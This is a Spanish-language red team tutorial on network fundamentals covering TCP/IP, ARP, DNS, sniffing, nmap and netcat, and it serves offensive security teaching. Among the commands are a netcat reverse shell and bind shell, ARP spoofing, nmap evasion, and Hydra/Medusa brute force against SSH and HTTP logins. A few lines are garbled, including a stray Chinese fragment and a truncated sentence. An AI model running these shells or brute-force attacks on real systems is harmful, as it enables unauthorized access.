# Red Team - Fase 1: Fundamentos de Red

## Introducción

En esta fase cubrimos los fundamentos de redes desde la perspectiva de un atacante. Entender cómo funcionan los protocolos de red es essential para cualquier pentester. No puedes explotar lo que no entiendes.

---

## 1. TCP/IP - El Protocolo Fundamental

### 1.1 El Modelo OSI vs TCP/IP

| Capa OSI | Capa TCP/IP | Protocolos |
|----------|-------------|------------|
| Aplicación | Aplicación | HTTP, DNS, FTP |
| Presentación | Aplicación | SSL/TLS |
| Sesión | Aplicación | NetBIOS, RPC |
| Transporte | Transporte | TCP, UDP |
| Red | Internet | IP, ICMP |
| Enlace | Acceso | Ethernet, ARP |
| Física | Acceso | Cable, NIC |

### 1.2 TCP vs UDP

| Característica | TCP | UDP |
|----------------|-----|-----|
| Orientado conexión | ✅ | ❌ |
| Entrega garantizada | ✅ | ❌ |
| Orden garante | ✅ | ❌ |
| Velocidad | Más lento | Más rápido |
| Uso | HTTP, SSH, FTP | DNS, VoIP, Video |

### 1.3 Three-Way Handshake

```
Cliente (A)                    Servidor (B)
    |                           |
    |------ SYN ------>         |
    |    seq=100               |
    |                           |
    |<----- SYN-ACK ----        |
    |    seq=200, ack=101       |
    |                           |
    |------ ACK ------>        |
    |    seq=101, ack=201       |
    |                           |
    |==== Conexión establecida ==|
```

**Flags TCP:**
- SYN (synchronize)
- ACK (acknowledge)
- FIN (finish)
- RST (reset)
- PSH (push)
- URG (urgent)

### 1.4 Estados de Conexión TCP

| Estado | Descripción |
|--------|-------------|
| LISTEN | Esperando conexión |
| SYN_SENT | SYN enviado |
| SYN_RECV | SYN recibido |
| ESTABLISHED | Conexión activa |
| FIN_WAIT | Cerrando conexión |
| CLOSE_WAIT | Esperando cierre |
| TIME_WAIT | Cerrado |

---

## 2. ARP - Address Resolution Protocol

### 2.1 Qué es ARP

ARP mapea direcciones IP a direcciones MAC. Es essential en redes locales (LAN).

### 2.2 Cómo Funciona

```
PC1 (192.168.1.10) quiere comu
1. PC1 verifica si 192.168.1.20 está en su subred
2. Busca en caché ARP local
3. Si no existe,广播arp who-has 192.168.1.20 tell 192.168.1.10
4. PC2 responde con su MAC
5. PC1 guarda en caché ARP
```

### 2.3 Tabla ARP

```bash
# Ver cache ARP
arp -a

# Ejemplo de salida
? (192.168.1.1) at xx:xx:xx:xx:xx:xx on eth0
? (192.168.1.77) at xx:xx:xx:xx:xx:xx on eth0
```

### 2.4 Ataques ARP Spoofing

**Concepto:** Un atacante responde a peticiones ARP que no son para él, dizendo su MAC como la del gateway.

**Impacto:**
- Man-in-the-Middle (MITM)
- Sesión hijacking
- Sniffing de tráfico

**Defensa:**
- Tabla ARP estática
- Dynamic ARP Inspection (DAI)
- Herramientas: `arpwatch`

---

## 3. DNS - Domain Name System

### 3.1 Jerarquía DNS

```
. (root)
├── .com
├── .org
├── .net
└── .es
    └── google.es
        ├── www.google.es
        ├── mail.google.es
        └── ...
```

### 3.2 Tipos de Registros DNS

| Tipo | Descripción | Ejemplo |
|------|-------------|---------|
| A | IPv4 | google.es → 142.250.185.3 |
| AAAA | IPv6 | google.es → 2001:4860:... |
| CNAME | Alias | blog.google.es → google.es |
| MX | Mail Exchange | mail.google.es |
| NS | Name Server | ns1.google.com |
| TXT | Texto | SPF, DMARC |
| PTR | Pointer (reverse) | IP → nombre |

### 3.3 Resolución DNS

```
1. Cliente pregunta: google.es?
2. Servidor local (ISP) verifica caché
3. Si no, pregunta a root server (.es)
4. Recibe NS de google.es
5. Pregunta a NS de google.es
6. Recibe respuesta A (IP)
7. Devuelve al cliente
```

### 3.4 DNS Reconnaissance

```bash
#Consulta básica
dig google.es

#Consulta específica de registro
dig MX google.es
dig NS google.es

#Transfers de zona (si permitido)
dig axfr google.es @ns1.google.com

#Dnsrecon
dnsrecon -d google.es

#Dnsenum
dnsenum google.es
```

### 3.5 DNS Attacks

| Ataque | Descripción |
|--------|-------------|
| DNS Spoofing | Respuestas DNS falsas |
| DNS Tunneling | Exfiltrar datos vía DNS |
| DNSSEC Bypass | Explotar configuraciones |
| DNS Rebinding | Cambiar IP resuelta |

---

## 4. Routing

### 4.1 Tabla de Routing

```bash
#Ver tabla de routing
ip route show
route -n
netstat -rn
```

**Ejemplo de salida:**
```
default via 192.168.1.1 dev eth0
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.10
```

### 4.2 Conceptos Clave

| Concepto | Descripción |
|----------|-------------|
| Gateway | Puerta de enlace |
| Metric | Costo de la ruta |
| Subnet mask | Define la red |
| Default route | Ruta por defecto |

### 4.3 Routing Estático vs Dinámico

| Tipo | Ventajas | Desventajas |
|------|----------|-------------|
| Estático | Simple, predictable | No escalable |
| Dinámico (RIP, OSPF, BGP) | Autoajustable | Complejo |

---

## 5. Sniffing - Captura de Tráfico

### 5.1 Modo Promiscuo

En modo promiscuo, la NIC captura todo el tráfico, no solo el dirigido a su MAC.

```bash
# Verificar modo promiscuo
ip link show eth0

# Activar modo promiscuo
ip link set eth0 promisc on
```

### 5.2 tcpdump

**Sintaxis básica:**
```bash
# Captura básica
tcpdump -i eth0

# Capturar con output detallado
tcpdump -i eth0 -v

# Guardar a archivo
tcpdump -i eth0 -w captura.pcap

# Leer archivo guardado
tcpdump -r captura.pcap

# Filtrar por host
tcpdump -i eth0 host 192.168.1.77

# Filtrar por puerto
tcpdump -i eth0 port 80

# Filtrar por protocolo
tcpdump -i eth0 icmp
tcpdump -i eth0 tcp
```

**Filtros avanzados:**
```bash
# TCP y puerto 80 o 443
tcpdump -i eth0 'tcp port (80 or 443)'

# No ARP
tcpdump -i eth0 not arp

# Paquetes SYN (escaneo)
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'
```

### 5.3 Wireshark

**Filtros comunes:**

| Filtro | Descripción |
|--------|-------------|
| `ip.addr == 192.168.1.10` | Filtrar por IP |
| `tcp.port == 80` | filtrar por puerto |
| `tcp.flags.syn == 1` | Solo SYNs |
| `http.request` | Solo requests HTTP |
| `dns` | Solo tráfico DNS |

**Análisis de handshake TCP:**
```
Follow TCP Stream (clic derecho →)
```

### 5.4 ARP Spoofing con tcpdump

```bash
# Detectar ARP spoofing
arpwatch -i eth0

# Ver solicitudes ARP
tcpdump -i eth0 arp

# MITM con arpspoof
arpspoof -i eth0 192.168.1.1
```

---

## 6. nmap - Escaneo de Puertos

### 6.1 Síntesis Básica

```bash
# Escaneo simple
nmap 192.168.1.77

# Escaneo de subred
nmap 192.168.1.0/24

# Puertos específicos
nmap -p 22,80,443 192.168.1.77

# Todos los puertos
nmap -p- 192.168.1.77
```

### 6.2 Tipos de Escaneo

| Tipo | Comando | Característica |
|------|---------|-----------------|
| TCP SYN | `-sS` | Rápido, silencioso, requiere root |
| TCP Connect | `-sT` | Funciona sin root |
| UDP | `-sU` | Lento, pero encuentra servicios UDP |
| ACK | `-sA` | Evadir-firewalls |
| Window | `-sW` | Similar a ACK |
| Maule | `-sM` | Like FIN |

**Implementación:**
```bash
# SYN (necesita root)
sudo nmap -sS 192.168.1.77

# TCP Connect (sin root)
nmap -sT 192.168.1.77

# UDP
sudo nmap -sU 192.168.1.77
```

### 6.3 Detección de OS

```bash
# Detección de SO
nmap -O 192.168.1.77

# Detección agresiva
nmap -A 192.168.1.77
```

### 6.4 Detección de Servicios

```bash
# Detectar versiones
nmap -sV 192.168.1.77

# Con scripts NSE
nmap -sC 192.168.1.77
```

### 6.5 Scripts NSE Útiles

| Script | Descripción |
|--------|-------------|
| `default` | Scripts por defecto |
| `vuln` | Buscar vulnerabilidades |
| `discovery` |Enumerar servicios |
| `auth` | Buscar credenciales |
| `brute` | Fuerza bruta |

```bash
# Scripts de vulnerabilidad
nmap --script vuln 192.168.1.77

# Scripts de fuerza bruta
nmap --script brute 192.168.1.77
```

### 6.6 Evasión y Ofuscación

```bash
# Fragmentar paquetes
nmap -f 192.168.1.77

# Usar decoys
nmap -D RND:10 192.168.1.77

# Cambiar timing (T0-T5)
nmap -T0 192.168.1.77
nmap -T4 192.168.1.77

# Cambiar puerto fuente
nmap -g 53 192.168.1.77
```

---

## 7. netcat - La Navaja Suiza

### 7.1 Conexión Básica

```bash
# Conexión a servidor
nc 192.168.1.77 80

# Conexión con output
nc -v 192.168.1.77 22
```

### 7.2 Escaneo de Puertos

```bash
# Escaneo de un puerto
nc -zv 192.168.1.77 80

# Escaneo de rango
nc -zv 192.168.1.77 1-1000
```

### 7.3 Transferencia de Archivos

```bash
# Enviar archivo (servidor)
nc -lp 1234 < archivo.txt

# Recibir archivo (cliente)
nc 192.168.1.10 1234 > archivo.txt
```

### 7.4 Reverse Shell

```bash
# Servidor (atacante) - escuchar
nc -lp 1234

# Cliente (víctima) - conectar
nc 192.168.1.10 1234 -e /bin/bash
```

### 7.5 Bind Shell

```bash
# Víctima - bind shell
nc -lp 1234 -e /bin/bash

# Atacante - conectar
nc 192.168.1.77 1234
```

---

## 8. Enumeración de Red

### 8.1 Descubrimiento de Hosts

```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Fping
fping -ag 192.168.1.0/24

# Netdiscover
netdiscover -i eth0 -r 192.168.1.0/24
```

### 8.2 Enumeración SMB

```bash
# Enum4linux
enum4linux 192.168.1.77

# nmap scripts
nmap -p 445 --script smb-enum* 192.168.1.77
```

### 8.3 Enumeración SNMP

```bash
# snmp-check
snmp-check 192.168.1.77

# nmap scripts
nmap -p 161 --script snmp-* 192.168.1.77
```

---

## 9. Herramientas de Fuerza Bruta

### 9.1 Hydra

```bash
# Fuerza bruta SSH
hydra -l root -P wordlist.txt 192.168.1.77 ssh

# Fuerza bruta HTTP
hydra -l admin -P wordlist.txt 192.168.1.77 http-post-form "/login:user=^USER^&pass=^PASS^:F=Incorrect"
```

### 9.2 Medusa

```bash
# Similar a hydra
medusa -h 192.168.1.77 -u root -P wordlist.txt -M ssh
```

---

## Resumen

| Tema | Concepto Clave |
|------|----------------|
| TCP/IP | Three-way handshake, flags |
| ARP | MAC → IP mapping, spoofing |
| DNS | Resolución, registros |
| Routing | Tablas, gateway |
| Sniffing | tcpdump, Wireshark |
| nmap | Escaneo, NSE |
| netcat | Conexiones, shells |

---

## Referencias

- Documentación oficial nmap: https://nmap.org/book/
- Wireshark Documentation: https://www.wireshark.org/docs/
- TCP/IP Illustrated, W. Richard Stevens
- The Web Application Hacker's Handbook